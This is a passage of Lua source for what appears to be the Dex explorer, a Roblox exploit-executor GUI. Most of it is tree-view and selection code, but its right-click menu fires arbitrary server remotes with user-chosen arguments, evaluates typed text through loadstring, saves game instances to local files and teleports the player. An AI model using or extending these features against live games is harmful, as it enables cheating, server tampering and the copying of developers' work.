				if not SelectionSet[object] then
					local node = NodeLookup[object]
					if node then
						table.insert(SelectionList,object)
						SelectionSet[object] = true
						node.Selected = true

						-- expand all ancestors so that selected node becomes visible
						node = node.Parent
						while node do
							if not node.Expanded then
								node.Expanded = true
								lupdate = true
							end
							node = node.Parent
						end
						supdate = true
					end
				end
				return lupdate,supdate
			end

			function Selection:Set(objects)
				local lupdate = false
				local supdate = false

				if #SelectionList > 0 then
					for i = 1,#SelectionList do
						local object = SelectionList[i]
						local node = NodeLookup[object]
						if node then
							node.Selected = false
							SelectionSet[object] = nil
						end
					end

					SelectionList = {}
					Selection.List = SelectionList
					supdate = true
				end

				for i = 1,#objects do
					local l,s = addObject(objects[i])
					lupdate = l or lupdate
					supdate = s or supdate
				end

				if lupdate then
					rawUpdateList()
					supdate = true
				elseif supdate then
					scrollBar:Update()
				end

				if supdate then
					bindSelectionChanged:Fire()
					updateActions()
				end
			end

			function Selection:Add(object)
				local l,s = addObject(object)
				if l then
					rawUpdateList()
					if Updates then
						bindSelectionChanged:Fire()
						updateActions()
					end
				elseif s then
					scrollBar:Update()
					if Updates then
						bindSelectionChanged:Fire()
						updateActions()
					end
				end
			end

			function Selection:StopUpdates()
				Updates = false
			end

			function Selection:ResumeUpdates()
				Updates = true
				bindSelectionChanged:Fire()
				updateActions()
			end

			function Selection:Remove(object,noupdate)
				if SelectionSet[object] then
					local node = NodeLookup[object]
					if node then
						node.Selected = false
						SelectionSet[object] = nil
						for i = 1,#SelectionList do
							if SelectionList[i] == object then
								table.remove(SelectionList,i)
								break
							end
						end

						if not noupdate then
							scrollBar:Update()
						end
						bindSelectionChanged:Fire()
						updateActions()
					end
				end
			end

			function Selection:Get()
				local list = {}
				for i = 1,#SelectionList do
					list[i] = SelectionList[i]
				end
				return list
			end

			bindSetSelection.OnInvoke = function(...)
				Selection:Set(...)
			end

			bindGetSelection.OnInvoke = function()
				return Selection:Get()
			end
		end

		function CreateCaution(title,msg)
			local newCaution = CautionWindow:Clone()
			newCaution.Title.Text = title
			newCaution.MainWindow.Desc.Text = msg
			newCaution.Parent = explorerPanel.Parent
			newCaution.Visible = true
			newCaution.MainWindow.Ok.MouseButton1Up:connect(function()
				newCaution:Destroy()
			end)
		end

		function CreateTableCaution(title,msg)
			if type(msg) ~= "table" then return CreateCaution(title,tostring(msg)) end
			local newCaution = TableCautionWindow:Clone()
			newCaution.Title.Text = title

			local TableList = newCaution.MainWindow.TableResults
			local TableTemplate = newCaution.MainWindow.TableTemplate

			for i,v in pairs(msg) do
				local newResult = TableTemplate:Clone()
				newResult.Type.Text = type(v)
				newResult.Value.Text = tostring(v)
				newResult.Position = UDim2.new(0,0,0,#TableList:GetChildren() * 20)
				newResult.Parent = TableList
				TableList.CanvasSize = UDim2.new(0,0,0,#TableList:GetChildren() * 20)
				newResult.Visible = true
			end
			newCaution.Parent = explorerPanel.Parent
			newCaution.Visible = true
			newCaution.MainWindow.Ok.MouseButton1Up:connect(function()
				newCaution:Destroy()
			end)
		end

		local function Split(str, delimiter)
			local start = 1
			local t = {}
			while true do
				local pos = string.find (str, delimiter, start, true)
				if not pos then
					break
				end
				table.insert (t, string.sub (str, start, pos - 1))
				start = pos + string.len (delimiter)
			end
			table.insert (t, string.sub (str, start))
			return t
		end

		local function ToValue(value,type)
			if type == "Vector2" then
				local list = Split(value,",")
				if #list < 2 then return nil end
				local x = tonumber(list[1]) or 0
				local y = tonumber(list[2]) or 0
				return Vector2.new(x,y)
			elseif type == "Vector3" then
				local list = Split(value,",")
				if #list < 3 then return nil end
				local x = tonumber(list[1]) or 0
				local y = tonumber(list[2]) or 0
				local z = tonumber(list[3]) or 0
				return Vector3.new(x,y,z)
			elseif type == "Color3" then
				local list = Split(value,",")
				if #list < 3 then return nil end
				local r = tonumber(list[1]) or 0
				local g = tonumber(list[2]) or 0
				local b = tonumber(list[3]) or 0
				return Color3.new(r/255,g/255, b/255)
			elseif type == "UDim2" then
				local list = Split(string.gsub(string.gsub(value, "{", ""),"}",""),",")
				if #list < 4 then return nil end
				local xScale = tonumber(list[1]) or 0
				local xOffset = tonumber(list[2]) or 0
				local yScale = tonumber(list[3]) or 0
				local yOffset = tonumber(list[4]) or 0
				return UDim2.new(xScale, xOffset, yScale, yOffset)
			elseif type == "Number" then
				return tonumber(value)
			elseif type == "String" then
				return value
			elseif type == "NumberRange" then
				local list = Split(value,",")
				if #list == 1 then
					if tonumber(list[1]) == nil then return nil end
					local newVal = tonumber(list[1]) or 0
					return NumberRange.new(newVal)
				end
				if #list < 2 then return nil end
				local x = tonumber(list[1]) or 0
				local y = tonumber(list[2]) or 0
				return NumberRange.new(x,y)
			elseif type == "Script" then
				local success,err = ypcall(function()
					_G.D_E_X_DONOTUSETHISPLEASE = nil
					loadstring(
						"_G.D_E_X_DONOTUSETHISPLEASE = "..value
					)()
					return _G.D_E_X_DONOTUSETHISPLEASE
				end)
				if err then
					return nil
				end
			else
				return nil
			end
		end

		local function ToPropValue(value,type)
			if type == "Vector2" then
				local list = Split(value,",")
				if #list < 2 then return nil end
				local x = tonumber(list[1]) or 0
				local y = tonumber(list[2]) or 0
				return Vector2.new(x,y)
			elseif type == "Vector3" then
				local list = Split(value,",")
				if #list < 3 then return nil end
				local x = tonumber(list[1]) or 0
				local y = tonumber(list[2]) or 0
				local z = tonumber(list[3]) or 0
				return Vector3.new(x,y,z)
			elseif type == "Color3" then
				local list = Split(value,",")
				if #list < 3 then return nil end
				local r = tonumber(list[1]) or 0
				local g = tonumber(list[2]) or 0
				local b = tonumber(list[3]) or 0
				return Color3.new(r/255,g/255, b/255)
			elseif type == "UDim2" then
				local list = Split(string.gsub(string.gsub(value, "{", ""),"}",""),",")
				if #list < 4 then return nil end
				local xScale = tonumber(list[1]) or 0
				local xOffset = tonumber(list[2]) or 0
				local yScale = tonumber(list[3]) or 0
				local yOffset = tonumber(list[4]) or 0
				return UDim2.new(xScale, xOffset, yScale, yOffset)
			elseif type == "Content" then
				return value
			elseif type == "float" or type == "int" or type == "double" then
				return tonumber(value)
			elseif type == "string" then
				return value
			elseif type == "NumberRange" then
				local list = Split(value,",")
				if #list == 1 then
					if tonumber(list[1]) == nil then return nil end
					local newVal = tonumber(list[1]) or 0
					return NumberRange.new(newVal)
				end
				if #list < 2 then return nil end
				local x = tonumber(list[1]) or 0
				local y = tonumber(list[2]) or 0
				return NumberRange.new(x,y)
			elseif string.sub(value,1,4) == "Enum" then
				local getEnum = value
				while true do
					local x,y = string.find(getEnum,".")
					if y then
						getEnum = string.sub(getEnum,y+1)
					else
						break
					end
				end
				print(getEnum)
				return getEnum
			else
				return nil
			end
		end

		function PromptRemoteCaller(inst)
			if CurrentRemoteWindow then
				CurrentRemoteWindow:Destroy()
				CurrentRemoteWindow = nil
			end
			CurrentRemoteWindow = RemoteWindow:Clone()
			CurrentRemoteWindow.Parent = explorerPanel.Parent
			CurrentRemoteWindow.Visible = true

			local displayValues = false

			local ArgumentList = CurrentRemoteWindow.MainWindow.Arguments
			local ArgumentTemplate = CurrentRemoteWindow.MainWindow.ArgumentTemplate

			if inst:IsA("RemoteEvent") then
				CurrentRemoteWindow.Title.Text = "Fire Event"
				CurrentRemoteWindow.MainWindow.Ok.Text = "Fire"
				CurrentRemoteWindow.MainWindow.DisplayReturned.Visible = false
				CurrentRemoteWindow.MainWindow.Desc2.Visible = false
			end

			local newArgument = ArgumentTemplate:Clone()
			newArgument.Parent = ArgumentList
			newArgument.Visible = true
			newArgument.Type.MouseButton1Down:connect(function()
				createDDown(newArgument.Type,function(choice)
					newArgument.Type.Text = choice
				end,"Script","Number","String","Color3","Vector3","Vector2","UDim2","NumberRange")
			end)

			CurrentRemoteWindow.MainWindow.Ok.MouseButton1Up:connect(function()
				if CurrentRemoteWindow and inst.Parent ~= nil then
					local MyArguments = {}
					for i,v in pairs(ArgumentList:GetChildren()) do
						table.insert(MyArguments,ToValue(v.Value.Text,v.Type.Text))
					end
					if inst:IsA("RemoteFunction") then
						if displayValues then
							spawn(function()
								local myResults = inst:InvokeServer(unpack(MyArguments))
								if myResults then
									CreateTableCaution("Remote Caller",myResults)
								else
									CreateCaution("Remote Caller","This remote did not return anything.")
								end
							end)
						else
							spawn(function()
								inst:InvokeServer(unpack(MyArguments))
							end)
						end
					else
						inst:FireServer(unpack(MyArguments))
					end
					CurrentRemoteWindow:Destroy()
					CurrentRemoteWindow = nil
				end
			end)

			CurrentRemoteWindow.MainWindow.Add.MouseButton1Up:connect(function()
				if CurrentRemoteWindow then
					local newArgument = ArgumentTemplate:Clone()
					newArgument.Position = UDim2.new(0,0,0,#ArgumentList:GetChildren() * 20)
					newArgument.Parent = ArgumentList
					ArgumentList.CanvasSize = UDim2.new(0,0,0,#ArgumentList:GetChildren() * 20)
					newArgument.Visible = true
					newArgument.Type.MouseButton1Down:connect(function()
						createDDown(newArgument.Type,function(choice)
							newArgument.Type.Text = choice
						end,"Script","Number","String","Color3","Vector3","Vector2","UDim2","NumberRange")
					end)
				end
			end)

			CurrentRemoteWindow.MainWindow.Subtract.MouseButton1Up:connect(function()
				if CurrentRemoteWindow then
					if #ArgumentList:GetChildren() > 1 then
						ArgumentList:GetChildren()[#ArgumentList:GetChildren()]:Destroy()
						ArgumentList.CanvasSize = UDim2.new(0,0,0,#ArgumentList:GetChildren() * 20)
					end
				end
			end)

			CurrentRemoteWindow.MainWindow.Cancel.MouseButton1Up:connect(function()
				if CurrentRemoteWindow then
					CurrentRemoteWindow:Destroy()
					CurrentRemoteWindow = nil
				end
			end)

			CurrentRemoteWindow.MainWindow.DisplayReturned.MouseButton1Up:connect(function()
				if displayValues then
					displayValues = false
					CurrentRemoteWindow.MainWindow.DisplayReturned.enabled.Visible = false
				else
					displayValues = true
					CurrentRemoteWindow.MainWindow.DisplayReturned.enabled.Visible = true
				end
			end)
		end

		function PromptSaveInstance(inst)
			if not SaveInstance and not _G.SaveInstance then CreateCaution("SaveInstance Missing","You do not have the SaveInstance function installed. Please go to RaspberryPi's thread to retrieve it.") return end
			if CurrentSaveInstanceWindow then
				CurrentSaveInstanceWindow:Destroy()
				CurrentSaveInstanceWindow = nil
				if explorerPanel.Parent:FindFirstChild("SaveInstanceOverwriteCaution") then
					explorerPanel.Parent.SaveInstanceOverwriteCaution:Destroy()
				end
			end
			CurrentSaveInstanceWindow = SaveInstanceWindow:Clone()
			CurrentSaveInstanceWindow.Parent = explorerPanel.Parent
			CurrentSaveInstanceWindow.Visible = true

			local filename = CurrentSaveInstanceWindow.MainWindow.FileName
			local saveObjects = true
			local overwriteCaution = false

			CurrentSaveInstanceWindow.MainWindow.Save.MouseButton1Up:connect(function()
				if readfile and getelysianpath then
					if readfile(getelysianpath()..filename.Text..".rbxmx") then
						if not overwriteCaution then
							overwriteCaution = true
							local newCaution = ConfirmationWindow:Clone()
							newCaution.Name = "SaveInstanceOverwriteCaution"
							newCaution.MainWindow.Desc.Text = "The file, "..filename.Text..".rbxmx, already exists. Overwrite?"
							newCaution.Parent = explorerPanel.Parent
							newCaution.Visible = true
							newCaution.MainWindow.Yes.MouseButton1Up:connect(function()
								ypcall(function()
									SaveInstance(inst,filename.Text..".rbxmx",not saveObjects)
								end)
								overwriteCaution = false
								newCaution:Destroy()
								if CurrentSaveInstanceWindow then
									CurrentSaveInstanceWindow:Destroy()
									CurrentSaveInstanceWindow = nil
								end
							end)
							newCaution.MainWindow.No.MouseButton1Up:connect(function()
								overwriteCaution = false
								newCaution:Destroy()
							end)
						end
					else
						ypcall(function()
							SaveInstance(inst,filename.Text..".rbxmx",not saveObjects)
						end)
						if CurrentSaveInstanceWindow then
							CurrentSaveInstanceWindow:Destroy()
							CurrentSaveInstanceWindow = nil
							if explorerPanel.Parent:FindFirstChild("SaveInstanceOverwriteCaution") then
								explorerPanel.Parent.SaveInstanceOverwriteCaution:Destroy()
							end
						end
					end
				else
					ypcall(function()
						if SaveInstance then
							SaveInstance(inst,filename.Text..".rbxmx",not saveObjects)
						else
							_G.SaveInstance(inst,filename.Text,not saveObjects)
						end
					end)
					if CurrentSaveInstanceWindow then
						CurrentSaveInstanceWindow:Destroy()
						CurrentSaveInstanceWindow = nil
						if explorerPanel.Parent:FindFirstChild("SaveInstanceOverwriteCaution") then
							explorerPanel.Parent.SaveInstanceOverwriteCaution:Destroy()
						end
					end
				end
			end)
			CurrentSaveInstanceWindow.MainWindow.Cancel.MouseButton1Up:connect(function()
				if CurrentSaveInstanceWindow then
					CurrentSaveInstanceWindow:Destroy()
					CurrentSaveInstanceWindow = nil
					if explorerPanel.Parent:FindFirstChild("SaveInstanceOverwriteCaution") then
						explorerPanel.Parent.SaveInstanceOverwriteCaution:Destroy()
					end
				end
			end)
			CurrentSaveInstanceWindow.MainWindow.SaveObjects.MouseButton1Up:connect(function()
				if saveObjects then
					saveObjects = false
					CurrentSaveInstanceWindow.MainWindow.SaveObjects.enabled.Visible = false
				else
					saveObjects = true
					CurrentSaveInstanceWindow.MainWindow.SaveObjects.enabled.Visible = true
				end
			end)
		end

		function DestroyRightClick()
			if currentRightClickMenu then
				currentRightClickMenu:Destroy()
				currentRightClickMenu = nil
			end
			if CurrentInsertObjectWindow and CurrentInsertObjectWindow.Visible then
				CurrentInsertObjectWindow.Visible = false
			end
		end

		function rightClickMenu(sObj)
			local mouse = game.Players.LocalPlayer:GetMouse()

			currentRightClickMenu = CreateRightClickMenu(
				{"Cut","Copy","Paste Into","Duplicate","Delete","Group","Ungroup","Select Children","Teleport To","Insert Part","Insert Object","View Script","Save Instance","Call Function","Call Remote"},
				"",
				false,
				function(option)
					if option == "Cut" then
						if not Option.Modifiable then return end
						clipboard = {}
						local list = Selection.List
						local cut = {}
						for i = 1,#list do
							local obj = list[i]:Clone()
							if obj then
								table.insert(clipboard,obj)
								table.insert(cut,list[i])
							end
						end
						for i = 1,#cut do
							pcall(delete,cut[i])
						end
						updateActions()
					elseif option == "Copy" then
						if not Option.Modifiable then return end
						clipboard = {}
						local list = Selection.List
						for i = 1,#list do
							table.insert(clipboard,list[i]:Clone())
						end
						updateActions()
					elseif option == "Paste Into" then
						if not Option.Modifiable then return end
						local parent = Selection.List[1] or workspace
						for i = 1,#clipboard do
							clipboard[i]:Clone().Parent = parent
						end
					elseif option == "Duplicate" then
						if not Option.Modifiable then return end
						local list = Selection:Get()
						for i = 1,#list do
							list[i]:Clone().Parent = Selection.List[1].Parent or workspace
						end
					elseif option == "Delete" then
						if not Option.Modifiable then return end
						local list = Selection:Get()
						for i = 1,#list do
							pcall(delete,list[i])
						end
						Selection:Set({})
					elseif option == "Group" then
						if not Option.Modifiable then return end
						local newModel = Instance.new("Model")
						local list = Selection:Get()
						newModel.Parent = Selection.List[1].Parent or workspace
						for i = 1,#list do
							list[i].Parent = newModel
						end
						Selection:Set({})
					elseif option == "Ungroup" then
						if not Option.Modifiable then return end
						local ungrouped = {}
						local list = Selection:Get()
						for i = 1,#list do
							if list[i]:IsA("Model") then
								for i2,v2 in pairs(list[i]:GetChildren()) do
									v2.Parent = list[i].Parent or workspace
									table.insert(ungrouped,v2)
								end		
								pcall(delete,list[i])			
							end
						end
						Selection:Set({})
						if SettingsRemote:Invoke("SelectUngrouped") then
							for i,v in pairs(ungrouped) do
								Selection:Add(v)
							end
						end
					elseif option == "Select Children" then
						if not Option.Modifiable then return end
						local list = Selection:Get()
						Selection:Set({})
						Selection:StopUpdates()
						for i = 1,#list do
							for i2,v2 in pairs(list[i]:GetChildren()) do
								Selection:Add(v2)
							end
						end
						Selection:ResumeUpdates()
					elseif option == "Teleport To" then
						if not Option.Modifiable then return end
						local list = Selection:Get()
						for i = 1,#list do
							if list[i]:IsA("BasePart") then
								pcall(function()
									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = list[i].CFrame
								end)
								break
							end
						end
					elseif option == "Insert Part" then
						if not Option.Modifiable then return end
						local insertedParts = {}
						local list = Selection:Get()
						for i = 1,#list do
							pcall(function()
								local newPart = Instance.new("Part")
								newPart.Parent = list[i]
								newPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.Head.Position) + Vector3.new(0,3,0)
								table.insert(insertedParts,newPart)
							end)
						end
					elseif option == "Save Instance" then
						if not Option.Modifiable then return end
						local list = Selection:Get()
						if #list == 1 then
							list[1].Archivable = true
							ypcall(function()PromptSaveInstance(list[1]:Clone())end)
						elseif #list > 1 then
							local newModel = Instance.new("Model")
							newModel.Name = "SavedInstances"
							for i = 1,#list do
								ypcall(function()
									list[i].Archivable = true
									list[i]:Clone().Parent = newModel
								end)
							end
							PromptSaveInstance(newModel)
						end
					elseif option == "Call Remote" then
						if not Option.Modifiable then return end
						local list = Selection:Get()
						for i = 1,#list do
							if list[i]:IsA("RemoteFunction") or list[i]:IsA("RemoteEvent") then
								PromptRemoteCaller(list[i])
								break
							end
						end
					elseif option == "View Script" then
						if not Option.Modifiable then return end
						local list = Selection:Get()
						for i = 1,#list do
							if list[i]:IsA("LocalScript") or list[i]:IsA("ModuleScript") then
								ScriptEditorEvent:Fire(list[i])
							end
						end
					end
				end)
			currentRightClickMenu.Parent = explorerPanel.Parent
			currentRightClickMenu.Position = UDim2.new(0,mouse.X,0,mouse.Y)
			if currentRightClickMenu.AbsolutePosition.X + currentRightClickMenu.AbsoluteSize.X > explorerPanel.AbsolutePosition.X + explorerPanel.AbsoluteSize.X then
				currentRightClickMenu.Position = UDim2.new(0, explorerPanel.AbsolutePosition.X + explorerPanel.AbsoluteSize.X - currentRightClickMenu.AbsoluteSize.X, 0, mouse.Y)
			end
		end

		local function cancelReparentDrag()end
		local function cancelSelectDrag()end
		do
			local listEntries = {}
			local nameConnLookup = {}

			local mouseDrag = Create('ImageButton',{
				Name = "MouseDrag";
				Position = UDim2.new(-0.25,0,-0.25,0);
				Size = UDim2.new(1.5,0,1.5,0);
				Transparency = 1;
				AutoButtonColor = false;
				Active = true;
				ZIndex = 10;
			})
			local function dragSelect(last,add,button)
				local connDrag
				local conUp

				conDrag = mouseDrag.MouseMoved:connect(function(x,y)
					local pos = Vector2.new(x,y) - listFrame.AbsolutePosition
					local size = listFrame.AbsoluteSize
					if pos.x < 0 or pos.x > size.x or pos.y < 0 or pos.y > size.y then return end

					local i = math.ceil(pos.y/ENTRY_BOUND) + scrollBar.ScrollIndex
					-- Mouse may have made a large step, so interpolate between the
					-- last index and the current.
					for n = i<last and i or last, i>last and i or last do
						local node = TreeList[n]
						if node then
							if add then
								Selection:Add(node.Object)
							else
								Selection:Remove(node.Object)
							end
						end
					end
					last = i
				end)

				function cancelSelectDrag()
					mouseDrag.Parent = nil
					conDrag:disconnect()
					conUp:disconnect()
					function cancelSelectDrag()end
				end

				conUp = mouseDrag[button]:connect(cancelSelectDrag)

				mouseDrag.Parent = GetScreen(listFrame)
			end

			local function dragReparent(object,dragGhost,clickPos,ghostOffset)
				local connDrag
				local conUp
				local conUp2

				local parentIndex = nil
				local dragged = false

				local parentHighlight = Create('Frame',{
					Transparency = 1;
					Visible = false;
					Create('Frame',{
						BorderSizePixel = 0;
						BackgroundColor3 = Color3.new(0,0,0);
						BackgroundTransparency = 0.1;
						Position = UDim2.new(0,0,0,0);
						Size = UDim2.new(1,0,0,1);
					});
					Create('Frame',{
						BorderSizePixel = 0;
						BackgroundColor3 = Color3.new(0,0,0);
						BackgroundTransparency = 0.1;
						Position = UDim2.new(1,0,0,0);
						Size = UDim2.new(0,1,1,0);
					});
					Create('Frame',{
						BorderSizePixel = 0;
						BackgroundColor3 = Color3.new(0,0,0);
						BackgroundTransparency = 0.1;
						Position = UDim2.new(0,0,1,0);
						Size = UDim2.new(1,0,0,1);
					});
					Create('Frame',{
						BorderSizePixel = 0;
						BackgroundColor3 = Color3.new(0,0,0);
						BackgroundTransparency = 0.1;
						Position = UDim2.new(0,0,0,0);
						Size = UDim2.new(0,1,1,0);
					});
				})
				SetZIndex(parentHighlight,9)

				conDrag = mouseDrag.MouseMoved:connect(function(x,y)
					local dragPos = Vector2.new(x,y)
					if dragged then
						local pos = dragPos - listFrame.AbsolutePosition
						local size = listFrame.AbsoluteSize

						parentIndex = nil
						parentHighlight.Visible = false
						if pos.x >= 0 and pos.x <= size.x and pos.y >= 0 and pos.y <= size.y + ENTRY_SIZE*2 then
							local i = math.ceil(pos.y/ENTRY_BOUND-2)
							local node = TreeList[i + scrollBar.ScrollIndex]
							if node and node.Object ~= object and not object:IsAncestorOf(node.Object) then
								parentIndex = i
								local entry = listEntries[i]
								if entry then
									parentHighlight.Visible = true
									parentHighlight.Position = UDim2.new(0,1,0,entry.AbsolutePosition.y-listFrame.AbsolutePosition.y)
									parentHighlight.Size = UDim2.new(0,size.x-4,0,entry.AbsoluteSize.y)
								end
							end
						end

						dragGhost.Position = UDim2.new(0,dragPos.x+ghostOffset.x,0,dragPos.y+ghostOffset.y)
					elseif (clickPos-dragPos).magnitude > 8 then
						dragged = true
						SetZIndex(dragGhost,9)
						dragGhost.IndentFrame.Transparency = 0.25
						dragGhost.IndentFrame.EntryText.TextColor3 = GuiColor.TextSelected
						dragGhost.Position = UDim2.new(0,dragPos.x+ghostOffset.x,0,dragPos.y+ghostOffset.y)
						dragGhost.Parent = GetScreen(listFrame)
						parentHighlight.Parent = listFrame
					end
				end)

				function cancelReparentDrag()
					mouseDrag.Parent = nil
					conDrag:disconnect()
					conUp:disconnect()
					conUp2:disconnect()
					dragGhost:Destroy()
					parentHighlight:Destroy()
					function cancelReparentDrag()end
				end

				local wasSelected = Selection.Selected[object]
				if not wasSelected and Option.Selectable then
					Selection:Set({object})
				end

				conUp = mouseDrag.MouseButton1Up:connect(function()
					cancelReparentDrag()
					if dragged then
						if parentIndex then
							local parentNode = TreeList[parentIndex + scrollBar.ScrollIndex]
							if parentNode then
								parentNode.Expanded = true

								local parentObj = parentNode.Object
								local function parent(a,b)
									a.Parent = b
								end
								if Option.Selectable then
									local list = Selection.List
									for i = 1,#list do
										pcall(parent,list[i],parentObj)
									end
								else
									pcall(parent,object,parentObj)
								end
							end
						end
					else
						-- do selection click
						if wasSelected and Option.Selectable then
							Selection:Set({})
						end
					end
				end)
				conUp2 = mouseDrag.MouseButton2Down:connect(function()
					cancelReparentDrag()
				end)

				mouseDrag.Parent = GetScreen(listFrame)
			end

			local entryTemplate = Create('ImageButton',{
				Name = "Entry";
				Transparency = 1;
				AutoButtonColor = false;
				Position = UDim2.new(0,0,0,0);
				Size = UDim2.new(1,0,0,ENTRY_SIZE);
				Create('Frame',{
					Name = "IndentFrame";
					BackgroundTransparency = 1;
					BackgroundColor3 = GuiColor.Selected;
					BorderColor3 = GuiColor.BorderSelected;
					Position = UDim2.new(0,0,0,0);
					Size = UDim2.new(1,0,1,0);
					Create(Icon('ImageButton',0),{
						Name = "Expand";
						AutoButtonColor = false;
						Position = UDim2.new(0,-GUI_SIZE,0.5,-GUI_SIZE/2);
						Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE);
					});
					Create(Icon(nil,0),{
						Name = "ExplorerIcon";
						Position = UDim2.new(0,2+ENTRY_PADDING,0.5,-GUI_SIZE/2);
						Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE);
					});
					Create('TextLabel',{
						Name = "EntryText";
						BackgroundTransparency = 1;
						TextColor3 = GuiColor.Text;
						TextXAlignment = 'Left';
						TextYAlignment = 'Center';
						Font = FONT;
						FontSize = FONT_SIZE;
						Text = "";
						Position = UDim2.new(0,2+ENTRY_SIZE+4,0,0);
						Size = UDim2.new(1,-2,1,0);
					});
				});
			})

			function scrollBar.UpdateCallback(self)
				for i = 1,self.VisibleSpace do
					local node = TreeList[i + self.ScrollIndex]
					if node then
						local entry = listEntries[i]
						if not entry then
							entry = Create(entryTemplate:Clone(),{
								Position = UDim2.new(0,2,0,ENTRY_BOUND*(i-1)+2);
								Size = UDim2.new(0,nodeWidth,0,ENTRY_SIZE);
								ZIndex = listFrame.ZIndex;
							})
							listEntries[i] = entry

							local expand = entry.IndentFrame.Expand
							expand.MouseEnter:connect(function()
								local node = TreeList[i + self.ScrollIndex]
								if #node > 0 then
									if node.Expanded then
										Icon(expand,NODE_EXPANDED_OVER)
									else
										Icon(expand,NODE_COLLAPSED_OVER)
									end
								end
							end)
							expand.MouseLeave:connect(function()
								local node = TreeList[i + self.ScrollIndex]
								if #node > 0 then
									if node.Expanded then
										Icon(expand,NODE_EXPANDED)
									else
										Icon(expand,NODE_COLLAPSED)
									end
								end
							end)
							expand.MouseButton1Down:connect(function()
								local node = TreeList[i + self.ScrollIndex]
								if #node > 0 then
									node.Expanded = not node.Expanded
									if node.Object == explorerPanel.Parent and node.Expanded then
										CreateCaution("Warning","Please be careful when editing instances inside here, this is like the System32 of Dex and modifying objects here can break Dex.")
									end
									-- use raw update so the list updates instantly
									rawUpdateList()
								end
							end)

							entry.MouseButton1Down:connect(function(x,y)
								local node = TreeList[i + self.ScrollIndex]
								DestroyRightClick()
								if GetAwaitRemote:Invoke() then
									bindSetAwaiting:Fire(node.Object)
									return
								end

								if not HoldingShift then
									lastSelectedNode = i + self.ScrollIndex
								end

								if HoldingShift and not filteringWorkspace() then
									if lastSelectedNode then
										if i + self.ScrollIndex - lastSelectedNode > 0 then
											Selection:StopUpdates()
											for i2 = 1, i + self.ScrollIndex - lastSelectedNode do
												local newNode = TreeList[lastSelectedNode + i2]
												if newNode then
													Selection:Add(newNode.Object)
												end
											end
											Selection:ResumeUpdates()
										else
											Selection:StopUpdates()
											for i2 = i + self.ScrollIndex - lastSelectedNode, 1 do
												local newNode = TreeList[lastSelectedNode + i2]
												if newNode then
													Selection:Add(newNode.Object)
												end
											end
											Selection:ResumeUpdates()
										end
									end
									return
								end

								if HoldingCtrl then
									if Selection.Selected[node.Object] then
										Selection:Remove(node.Object)
									else
										Selection:Add(node.Object)
									end
									return
								end
								if Option.Modifiable then
									local pos = Vector2.new(x,y)
									dragReparent(node.Object,entry:Clone(),pos,entry.AbsolutePosition-pos)
								elseif Option.Selectable then
									if Selection.Selected[node.Object] then
										Selection:Set({})
									else
										Selection:Set({node.Object})
									end
									dragSelect(i+self.ScrollIndex,true,'MouseButton1Up')
								end
							end)

							entry.MouseButton2Down:connect(function()
								if not Option.Selectable then return end

								DestroyRightClick()

								curSelect = entry

								local node = TreeList[i + self.ScrollIndex]

								if GetAwaitRemote:Invoke() then
									bindSetAwaiting:Fire(node.Object)
									return
								end

								if not Selection.Selected[node.Object] then
									Selection:Set({node.Object})
								end
							end)


							entry.MouseButton2Up:connect(function()
								if not Option.Selectable then return end

								local node = TreeList[i + self.ScrollIndex]

								if checkMouseInGui(curSelect) then
									rightClickMenu(node.Object)
								end
							end)

							entry.Parent = listFrame
						end

						entry.Visible = true

						local object = node.Object

						-- update expand icon
						if #node == 0 then
							entry.IndentFrame.Expand.Visible = false
						elseif node.Expanded then
							Icon(entry.IndentFrame.Expand,NODE_EXPANDED)
							entry.IndentFrame.Expand.Visible = true
						else
							Icon(entry.IndentFrame.Expand,NODE_COLLAPSED)
							entry.IndentFrame.Expand.Visible = true
						end

						-- update explorer icon
						Icon(entry.IndentFrame.ExplorerIcon,ExplorerIndex[object.ClassName] or 0)

						-- update indentation
						local w = (node.Depth)*(2+ENTRY_PADDING+GUI_SIZE)
						entry.IndentFrame.Position = UDim2.new(0,w,0,0)
						entry.IndentFrame.Size = UDim2.new(1,-w,1,0)

						-- update name change detection
						if nameConnLookup[entry] then
							nameConnLookup[entry]:disconnect()
						end
						local text = entry.IndentFrame.EntryText
						text.Text = object.Name
						nameConnLookup[entry] = node.Object.Changed:connect(function(p)
							if p == 'Name' then
								text.Text = object.Name
							end
						end)

						-- update selection
						entry.IndentFrame.Transparency = node.Selected and 0 or 1
						text.TextColor3 = GuiColor[node.Selected and 'TextSelected' or 'Text']

						entry.Size = UDim2.new(0,nodeWidth,0,ENTRY_SIZE)
					elseif listEntries[i] then
						listEntries[i].Visible = false
					end
				end
				for i = self.VisibleSpace+1,self.TotalSpace do
					local entry = listEntries[i]
					if entry then
						listEntries[i] = nil
						entry:Destroy()
					end
				end
			end

			function scrollBarH.UpdateCallback(self)
				for i = 1,scrollBar.VisibleSpace do
					local node = TreeList[i + scrollBar.ScrollIndex]
					if node then
						local entry = listEntries[i]
						if entry then
							entry.Position = UDim2.new(0,2 - scrollBarH.ScrollIndex,0,ENTRY_BOUND*(i-1)+2)
						end
					end
				end
			end

			Connect(listFrame.Changed,function(p)
				if p == 'AbsoluteSize' then
					rawUpdateSize()
				end
			end)

			local wheelAmount = 6
			explorerPanel.MouseWheelForward:connect(function()
				if scrollBar.VisibleSpace - 1 > wheelAmount then
					scrollBar:ScrollTo(scrollBar.ScrollIndex - wheelAmount)
				else
					scrollBar:ScrollTo(scrollBar.ScrollIndex - scrollBar.VisibleSpace)
				end
			end)
			explorerPanel.MouseWheelBackward:connect(function()
				if scrollBar.VisibleSpace - 1 > wheelAmount then
					scrollBar:ScrollTo(scrollBar.ScrollIndex + wheelAmount)
				else
					scrollBar:ScrollTo(scrollBar.ScrollIndex + scrollBar.VisibleSpace)
				end
			end)
		end

		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		---- Object detection

		-- Inserts `v` into `t` at `i`. Also sets `Index` field in `v`.
		local function insert(t,i,v)
			for n = #t,i,-1 do
				local v = t[n]
				v.Index = n+1
				t[n+1] = v
			end
			v.Index = i
			t[i] = v
		end

		-- Removes `i` from `t`. Also sets `Index` field in removed value.
		local function remove(t,i)
			local v = t[i]
			for n = i+1,#t do
				local v = t[n]
				v.Index = n-1
				t[n-1] = v
			end
			t[#t] = nil
			v.Index = 0
			return v
		end

		-- Returns how deep `o` is in the tree.
		local function depth(o)
			local d = -1
			while o do
				o = o.Parent
				d = d + 1
			end
			return d
		end


